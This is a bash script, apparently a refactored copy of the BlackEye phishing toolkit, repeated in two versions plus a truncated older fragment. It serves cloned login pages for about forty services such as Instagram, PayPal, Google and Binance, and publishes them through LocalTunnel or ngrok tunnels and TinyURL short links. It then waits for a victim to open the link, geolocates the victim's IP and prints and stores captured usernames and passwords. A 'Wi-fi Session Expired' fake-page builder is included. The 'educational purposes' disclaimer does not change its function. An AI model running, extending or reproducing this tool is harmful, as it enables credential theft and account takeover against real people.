#!/bin/bash

# ------------------------------------------------------------
# BlackEye v1.3 – Refactored for educational labs
# Added ngrok tunneling support (option 2)
# ------------------------------------------------------------
VERSION="1.3"

# ------------------------------------------------------------
# Helper: coloured log output
# ------------------------------------------------------------
log_info()   { printf "\e[1;94m[+] %s\e[0m\n" "$*"; }
log_warn()   { printf "\e[1;93m[!] %s\e[0m\n" "$*"; }
log_success(){ printf "\e[1;92m[✓] %s\e[0m\n" "$*"; }

# ------------------------------------------------------------
# Dependency check – aborts if a required binary is missing
# ------------------------------------------------------------
check_deps() {
    local missing=0
    for dep in php node lt curl jq ngrok; do
        command -v $dep >/dev/null 2>&1 || { log_warn "Missing dependency: $dep"; missing=1; }
    done
    (( missing )) && { log_warn "Please install the missing dependencies and restart."; exit 1; }
    log_success "All required dependencies are present."
}

# ------------------------------------------------------------
# Banner – displays disclaimer and version information
# ------------------------------------------------------------
banner() {
    printf "\e[101m\e[1;77:: Disclaimer: Developers assume no liability and are not responsible for any misuse or damage caused by BlackEye. ::\e[0m\n"
    printf "\e[101m\e[1;77:: Only use for educational purposes!! (Version $VERSION) ::\e[0m\n"
    printf "\e[101m\e[1;77::     BLACKEYE By @shuvo-halder                             ::\e[0m\n"
    printf "\n"
}

# ------------------------------------------------------------
# Platform map – defines the numeric menu and associated folder
# ------------------------------------------------------------
declare -A PLATFORMS=(
    [1]=instagram     [2]=facebook      [3]=snapchat    [4]=twitter
    [5]=github        [6]=google        [7]=origin      [8]=yahoo
    [9]=linkedin      [10]=protonmail  [11]=wordpress  [12]=microsoft
    [13]=instafollowers [14]=pinterest [15]=apple      [16]=verizon
    [17]=dropbox      [18]=line        [19]=shopify    [20]=messenger
    [21]=gitlab       [22]=twitch      [23]=myspace    [24]=badoo
    [25]=vk          [26]=yandex      [27]=devianart  [28]=wifi
    [29]=paypal      [30]=steam       [31]=tiktok     [32]=playstation
    [33]=shopping    [34]=amazon      [35]=icloud     [36]=spotify
    [37]=netflix     [38]=reddit      [39]=stackoverflow [40]=create
    [41]=binance    # special – opens the project page
)

# ------------------------------------------------------------
# Menu – prints a compact, colour‑coded list of platforms
# ------------------------------------------------------------
menu() {
    printf "\nSelect a target platform (or 41 for project page):\n"
    for i in "${!PLATFORMS[@]}"; do
        printf "  \e[1;92m[%02d]\e[0m \e[1;91m%s\e[0m\n" "$i" "${PLATFORMS[$i]}"
    done
    printf "\nEnter choice: "
    read -r option
    if [[ -z "${PLATFORMS[$option]}" ]]; then
        log_warn "Invalid option!"
        menu
        return
    fi
    server="${PLATFORMS[$option]}"
    if [[ "$option" -eq 41 ]]; then
        open_page
        return
    fi
    start
}

# ------------------------------------------------------------
# Open project page (option 41)
# ------------------------------------------------------------
open_page() {
    local url="https://github.com/EricksonAtHome/bes"
    if command -v open >/dev/null 2>&1; then
        open "$url"
    else
        xdg-open "$url" >/dev/null 2>&1 || echo "Please open $url manually"
    fi
}

# ------------------------------------------------------------
# Prompt for tunnelling method – now offers LocalTunnel (1) and ngrok (2)
# ------------------------------------------------------------
start() {
    printf "\nChoose tunnelling method:\n"
    printf "  1) LocalTunnel\n"
    printf "  2) ngrok\n"
    read -r method
    case "$method" in
        1) start_localtunnel;;
        2) start_ngrok;;
        *) log_warn "Unsupported method – defaulting to LocalTunnel"; start_localtunnel;;
    esac
}

# ------------------------------------------------------------
# LocalTunnel launch – starts PHP server and prints URLs
# ------------------------------------------------------------
start_localtunnel() {
    # clean previous artefacts
    [[ -e sites/$server/ip.txt ]] && rm -f sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -f sites/$server/usernames.txt

    log_info "Starting php server for $server..."
    ( cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 & )
    sleep 2

    log_info "Launching LocalTunnel..."
    lt --port 5555 --subdomain "wmw-$server-com" >/dev/null 2>&1 &
    sleep 4
    local public="https://wmw-${server}-com.loca.lt"
    log_success "Public URL: $public"
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$public")
    log_success "Short URL: $short_link"
    checkfound
}

# ------------------------------------------------------------
# ngrok launch – starts PHP server, invokes ngrok, extracts public URL
# ------------------------------------------------------------
start_ngrok() {
    # clean previous artefacts
    [[ -e sites/$server/ip.txt ]] && rm -f sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -f sites/$server/usernames.txt

    log_info "Starting php server for $server..."
    ( cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 & )
    PHP_PID=$!
    sleep 2

    # If NGROK_AUTHTOKEN is set, configure it (run once)
    if [[ -n "$NGROK_AUTHTOKEN" ]]; then
        ngrok authtoken "$NGROK_AUTHTOKEN" >/dev/null 2>&1 || log_warn "Failed to set ngrok authtoken"
    fi

    log_info "Launching ngrok..."
    ngrok http 5555 >/dev/null 2>&1 &
    NGROK_PID=$!
    # give ngrok a moment to start and expose the API
    sleep 5
    # grab the public URL via the local ngrok API (default 4040)
    public=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$public" || "$public" == "null" ]]; then
        log_warn "Failed to obtain ngrok public URL"
        kill $NGROK_PID $PHP_PID 2>/dev/null
        return
    fi
    log_success "Public URL: $public"
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$public")
    log_success "Short URL: $short_link"
    checkfound
}

# ------------------------------------------------------------
# Wait for victim to open the link and capture IP
# ------------------------------------------------------------
checkfound() {
    log_info "Waiting for victim to open the link..."
    while true; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            log_success "IP file detected!"
            catch_ip
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Capture and display IP / Geo data
# ------------------------------------------------------------
catch_ip() {
    touch "sites/$server/saved.ip.txt"
    ip=$(grep -a 'IP:' "sites/$server/ip.txt" | cut -d ' ' -f2 | tr -d '\r')
    ua=$(grep 'User-Agent:' "sites/$server/ip.txt" | cut -d '"' -f2)
    # Geo lookups – simple curl + jq (fail silently on network issues)
    cn=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.country_name' 2>/dev/null || echo "N/A")
    re=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.region' 2>/dev/null || echo "N/A")
    ct=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.city' 2>/dev/null || echo "N/A")
    log_success "IP: $ip | UA: $ua"
    log_success "Location: $cn / $re / $ct"
    cat "sites/$server/ip.txt" >> "sites/$server/saved.ip.txt"
    getcredentials
}

# ------------------------------------------------------------
# Poll for captured credentials
# ------------------------------------------------------------
getcredentials() {
    log_info "Waiting for credentials..."
    while true; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            log_success "Credentials file found!"
            catch_cred
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Display and store captured credentials
# ------------------------------------------------------------
catch_cred() {
    account=$(grep -o 'Account:.*' "sites/$server/usernames.txt" | cut -d ' ' -f2-)
    password=$(grep -o 'Pass:.*' "sites/$server/usernames.txt" | cut -d ':' -f2-)
    log_success "Account: $account"
    log_success "Password: $password"
    cat "sites/$server/usernames.txt" >> "sites/$server/saved.usernames.txt"
    # Clean up running services
    kill $PHP_PID $NGROK_PID 2>/dev/null
    killall -2 php >/dev/null 2>&1
    killall -2 node >/dev/null 2>&1
    exit 1
}

# ------------------------------------------------------------
# Custom page builder (unchanged – retained for completeness)
# ------------------------------------------------------------
createpage() {
    local default_cap1="Wi-fi Session Expired"
    local default_cap2="Please login again."
    local default_user_text="Username:"
    local default_pass_text="Password:"
    local default_sub_text="Log-In"

    read -p $'\e[1;92m[*]\e[0m Title 1 (Default: Wi-fi Session Expired): ' cap1
    cap1=${cap1:-$default_cap1}
    read -p $'\e[1;92m[*]\e[0m Title 2 (Default: Please login again.): ' cap2
    cap2=${cap2:-$default_cap2}
    read -p $'\e[1;92m[*]\e[0m Username field (Default: Username:): ' user_text
    user_text=${user_text:-$default_user_text}
    read -p $'\e[1;92m[*]\e[0m Password field (Default: Password:): ' pass_text
    pass_text=${pass_text:-$default_pass_text}
    read -p $'\e[1;92m[*]\e[0m Submit field (Default: Log‑In): ' sub_text
    sub_text=${sub_text:-$default_sub_text}

    cat <<EOF > sites/create/login.html
<!DOCTYPE html>
<html>
<body bgcolor="gray" text="white">
<center><h2>$cap1<br><br>$cap2</h2></center>
<center>
<form method="POST" action="login.php">
<label>$user_text</label><br>
<input type="text" name="username" size="64"><br>
<label>$pass_text</label><br>
<input type="password" name="password" size="64"><br><br>
<input type="submit" value="$sub_text">
</form>
</center>
</body>
</html>
EOF
}

# ------------------------------------------------------------
# Graceful termination – kills background services (php, ngrok, node)
# ------------------------------------------------------------
stop() {
    pkill -f -2 php >/dev/null 2>&1
    pkill -f -2 node >/dev/null 2>&1
    pkill -f -2 ngrok >/dev/null 2>&1
    kill $PHP_PID $NGROK_PID 2>/dev/null
    killall -2 php >/dev/null 2>&1
    killall -2 node >/dev/null 2>&1
    killall -2 ngrok >/dev/null 2>&1
}

# ------------------------------------------------------------
# Main execution flow
# ------------------------------------------------------------
trap 'printf "\n"; stop; exit 1' INT TERM
check_deps
banner
menu

# End of file


# ------------------------------------------------------------
# BlackEye v1.3 – Refactored for educational labs
# ------------------------------------------------------------
# Version identifier – useful for logs and the banner
VERSION="1.3"

# ------------------------------------------------------------
# Helper: coloured log output
# ------------------------------------------------------------
log_info()   { printf "\e[1;94m[+] %s\e[0m\n" "$*"; }
log_warn()   { printf "\e[1;93m[!] %s\e[0m\n" "$*"; }
log_success(){ printf "\e[1;92m[✓] %s\e[0m\n" "$*"; }

# ------------------------------------------------------------
# Dependency check – aborts if a required binary is missing
# ------------------------------------------------------------
check_deps() {
    local missing=0
    for dep in php node lt curl jq; do
        command -v $dep >/dev/null 2>&1 || { log_warn "Missing dependency: $dep"; missing=1; }
    done
    (( missing )) && { log_warn "Please install the missing dependencies and restart."; exit 1; }
    log_success "All required dependencies are present."
}

# ------------------------------------------------------------
# Banner – displays disclaimer and version information
# ------------------------------------------------------------
banner() {
    printf "\e[101m\e[1;77:: Disclaimer: Developers assume no liability and are not responsible for any misuse or damage caused by BlackEye. ::\e[0m\n"
    printf "\e[101m\e[1;77:: Only use for educational purposes!! (Version $VERSION) ::\e[0m\n"
    printf "\e[101m\e[1;77::     BLACKEYE By @shuvo-halder                             ::\e[0m\n"
    printf "\n"
}

# ------------------------------------------------------------
# Platform map – defines the numeric menu and associated folder
# ------------------------------------------------------------
declare -A PLATFORMS=(
    [1]=instagram     [2]=facebook      [3]=snapchat    [4]=twitter
    [5]=github        [6]=google        [7]=origin      [8]=yahoo
    [9]=linkedin      [10]=protonmail  [11]=wordpress  [12]=microsoft
    [13]=instafollowers [14]=pinterest [15]=apple      [16]=verizon
    [17]=dropbox      [18]=line        [19]=shopify    [20]=messenger
    [21]=gitlab       [22]=twitch      [23]=myspace    [24]=badoo
    [25]=vk          [26]=yandex      [27]=devianart  [28]=wifi
    [29]=paypal      [30]=steam       [31]=tiktok     [32]=playstation
    [33]=shopping    [34]=amazon      [35]=icloud     [36]=spotify
    [37]=netflix     [38]=reddit      [39]=stackoverflow [40]=create
    [41]=binance    # special – opens the project page
)

# ------------------------------------------------------------
# Menu – prints a compact, colour‑coded list of platforms
# ------------------------------------------------------------
menu() {
    printf "\nSelect a target platform (or 41 for project page):\n"
    for i in "${!PLATFORMS[@]}"; do
        printf "  \e[1;92m[%02d]\e[0m \e[1;91m%s\e[0m\n" "$i" "${PLATFORMS[$i]}"
    done
    printf "\nEnter choice: "
    read -r option
    if [[ -z "${PLATFORMS[$option]}" ]]; then
        log_warn "Invalid option!"
        menu
        return
    fi
    server="${PLATFORMS[$option]}"
    if [[ "$option" -eq 41 ]]; then
        open_page
        return
    fi
    start
}

# ------------------------------------------------------------
# Open project page (option 41)
# ------------------------------------------------------------
open_page() {
    local url="https://github.com/EricksonAtHome/bes"
    if command -v open >/dev/null 2>&1; then
        open "$url"
    else
        xdg-open "$url" >/dev/null 2>&1 || echo "Please open $url manually"
    fi
}

# ------------------------------------------------------------
# Prompt for tunnelling method – currently only LocalTunnel
# ------------------------------------------------------------
start() {
    printf "\nChoose tunnelling method (1) LocalTunnel : "
    read -r host
    case "$host" in
        1) start_localtunnel;;
        *) log_warn "Unsupported method – defaulting to LocalTunnel"; start_localtunnel;;
    esac
}

# ------------------------------------------------------------
# LocalTunnel launch – starts PHP server and prints URLs
# ------------------------------------------------------------
start_localtunnel() {
    # clean previous artefacts
    [[ -e sites/$server/ip.txt ]] && rm -f sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -f sites/$server/usernames.txt

    log_info "Starting php server for $server..."
    ( cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 & )
    sleep 2

    log_info "Launching LocalTunnel..."
    lt --port 5555 --subdomain "wmw-$server-com" >/dev/null 2>&1 &
    sleep 4
    local public="https://wmw-${server}-com.loca.lt"
    log_success "Public URL: $public"
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$public")
    log_success "Short URL: $short_link"
    checkfound
}

# ------------------------------------------------------------
# Wait for victim to open the link and capture IP
# ------------------------------------------------------------
checkfound() {
    log_info "Waiting for victim to open the link..."
    while true; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            log_success "IP file detected!"
            catch_ip
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Capture and display IP / Geo data
# ------------------------------------------------------------
catch_ip() {
    touch "sites/$server/saved.ip.txt"
    ip=$(grep -a 'IP:' "sites/$server/ip.txt" | cut -d ' ' -f2 | tr -d '\r')
    ua=$(grep 'User-Agent:' "sites/$server/ip.txt" | cut -d '"' -f2)
    # Geo lookups – simple curl + jq (fail silently on network issues)
    cn=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.country_name' 2>/dev/null || echo "N/A")
    re=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.region' 2>/dev/null || echo "N/A")
    ct=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.city' 2>/dev/null || echo "N/A")
    log_success "IP: $ip | UA: $ua"
    log_success "Location: $cn / $re / $ct"
    cat "sites/$server/ip.txt" >> "sites/$server/saved.ip.txt"
    getcredentials
}

# ------------------------------------------------------------
# Poll for captured credentials
# ------------------------------------------------------------
getcredentials() {
    log_info "Waiting for credentials..."
    while true; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            log_success "Credentials file found!"
            catch_cred
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Display and store captured credentials
# ------------------------------------------------------------
catch_cred() {
    account=$(grep -o 'Account:.*' "sites/$server/usernames.txt" | cut -d ' ' -f2-)
    password=$(grep -o 'Pass:.*' "sites/$server/usernames.txt" | cut -d ':' -f2-)
    log_success "Account: $account"
    log_success "Password: $password"
    cat "sites/$server/usernames.txt" >> "sites/$server/saved.usernames.txt"
    # Clean up running services
    killall -2 php >/dev/null 2>&1
    killall -2 node >/dev/null 2>&1
    exit 1
}

# ------------------------------------------------------------
# Custom page builder (unchanged – retained for completeness)
# ------------------------------------------------------------
createpage() {
    local default_cap1="Wi-fi Session Expired"
    local default_cap2="Please login again."
    local default_user_text="Username:"
    local default_pass_text="Password:"
    local default_sub_text="Log-In"

    read -p $'\e[1;92m[*]\e[0m Title 1 (Default: Wi-fi Session Expired): ' cap1
    cap1=${cap1:-$default_cap1}
    read -p $'\e[1;92m[*]\e[0m Title 2 (Default: Please login again.): ' cap2
    cap2=${cap2:-$default_cap2}
    read -p $'\e[1;92m[*]\e[0m Username field (Default: Username:): ' user_text
    user_text=${user_text:-$default_user_text}
    read -p $'\e[1;92m[*]\e[0m Password field (Default: Password:): ' pass_text
    pass_text=${pass_text:-$default_pass_text}
    read -p $'\e[1;92m[*]\e[0m Submit field (Default: Log‑In): ' sub_text
    sub_text=${sub_text:-$default_sub_text}

    cat <<EOF > sites/create/login.html
<!DOCTYPE html>
<html>
<body bgcolor="gray" text="white">
<center><h2>$cap1<br><br>$cap2</h2></center>
<center>
<form method="POST" action="login.php">
<label>$user_text</label><br>
<input type="text" name="username" size="64"><br>
<label>$pass_text</label><br>
<input type="password" name="password" size="64"><br><br>
<input type="submit" value="$sub_text">
</form>
</center>
</body>
</html>
EOF
}

# ------------------------------------------------------------
# Graceful termination – kills background services
# ------------------------------------------------------------
stop() {
    pkill -f -2 php >/dev/null 2>&1
    pkill -f -2 node >/dev/null 2>&1
    killall -2 php >/dev/null 2>&1
    killall -2 node >/dev/null 2>&1
}

# ------------------------------------------------------------
# Main execution flow
# ------------------------------------------------------------
trap 'printf "\n"; stop; exit 1' INT TERM
check_deps
banner
menu

# End of file


open_page() {
    url="https://github.com/EricksonAtHome/bes"
     open "$url"
}

start_server() {
    server=$1
    # Start de server
    echo "Start de server voor: $server"
}

# Upgraded by: @shuvo-halder (https://github.com/shuvo-halder/blackeye)
trap 'printf "\n";stop;exit 1' 2
menu() {

printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m               \n"                                
printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m Line  \e[0m         \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;91m Amazon\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;91m iCloud\e[0m          \n"
printf "          \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m   \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m      \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m      \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;91m Reddit\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m MySpace    \e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;91m StackOverflow\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;91m Custom\e[0m         \n"        
printf "          \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                   \n"         
printf "          \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m               \n"
printf "          \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"
printf "          \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m Wi-Fi   \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m PayPal  \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Tiktok \e[0m                             \n"
printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
printf "          \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;91m Binance Email Support \e[0m       \e[1;94m             \n"


read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
 └──╼ ~ ' option



if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="origin"
start

elif [[ $option == 8 ]]; then
server="yahoo"
start

elif [[ $option == 9 ]]; then
server="linkedin"
start

elif [[ $option == 10 ]]; then
server="protonmail"
start

elif [[ $option == 11 ]]; then
server="wordpress"
start

elif [[ $option == 12 ]]; then
server="microsoft"
start

elif [[ $option == 13 ]]; then
server="instafollowers"
start

elif [[ $option == 14 ]]; then
server="pinterest"
start

elif [[ $option == 15 ]]; then
server="apple"
start

elif [[ $option == 16 ]]; then
server="verizon"
start

elif [[ $option == 17 ]]; then
server="dropbox"
start

elif [[ $option == 18 ]]; then
server="line"
start

elif [[ $option == 19 ]]; then
server="shopify"
start

elif [[ $option == 20 ]]; then
server="messenger"
start

elif [[ $option == 21 ]]; then
server="gitlab"
start

elif [[ $option == 22 ]]; then
server="twitch"
start

elif [[ $option == 23 ]]; then
server="myspace"
start

elif [[ $option == 24 ]]; then
server="badoo"
start

elif [[ $option == 25 ]]; then
server="vk"
start

elif [[ $option == 26 ]]; then
server="yandex"
start

elif [[ $option == 27 ]]; then
server="devianart"
start

elif [[ $option == 28 ]]; then
server="wifi"
start

elif [[ $option == 29 ]]; then
server="paypal"
start

elif [[ $option == 30 ]]; then
server="steam"
start

elif [[ $option == 31 ]]; then
server="tiktok"
start

elif [[ $option == 32 ]]; then
server="playstation"
start

elif [[ $option == 33 ]]; then
server="shopping"
start

elif [[ $option == 34 ]]; then
server="amazon"
start

elif [[ $option == 35 ]]; then
server="icloud"
start

elif [[ $option == 36 ]]; then
server="spotify"
start

elif [[ $option == 37 ]]; then
server="netflix"
start

elif [[ $option == 38 ]]; then
server="reddit"
start

elif [[ $option == 39 ]]; then
server="stackoverflow"
start

elif [[ $option == 40 ]]; then
server="create"
createpage
start

elif [[ $option == 41 ]]; then
    open_page


else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}


stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
checknode=$(ps aux | grep -o "node" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checknode == *'node'* ]]; then
pkill -f -2 node > /dev/null 2>&1
killall -2 node > /dev/null 2>&1
fi

}

banner() {


printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m::     BLACKEYE By @shuvo-halder                             ::\e[0m\n"
printf "\n"
}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 node > /dev/null 2>&1
exit 1

}

getcredentials() {
echo ' '
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
ipv4=`curl -s https://ipinfo.io/$ip/json | jq -r  '.ip'`
cn=`curl -s https://ipapi.co/$ip//json | jq -r  '.country_name'`
re=`curl -s https://ipapi.co/$ip//json | jq -r  '.region'`
ct=`curl -s https://ipapi.co/$ip//json | jq -r '.city'`
post=`curl -s https://ipapi.co/$ip//json | jq -r  '.postal'`
loc=`curl -s https://ipinfo.io/$ip/json | jq -r  '.loc'`
org=`curl -s https://ipinfo.io/$ip/json | jq -r  '.org'`
tz=`curl -s https://ipinfo.io/$ip/json | jq -r '.timezone'`
lat=`curl -s https://ipapi.co/$ip/json/ | jq -r '.latitude'`
lon=`curl -s https://ipapi.co/$ip/json/ | jq -r '.longitude'`

gm=`echo "https://www.google.com/maps/search/?api=1&query="$lat,$lon`

printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $cn
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" $re
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $ct
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" $post
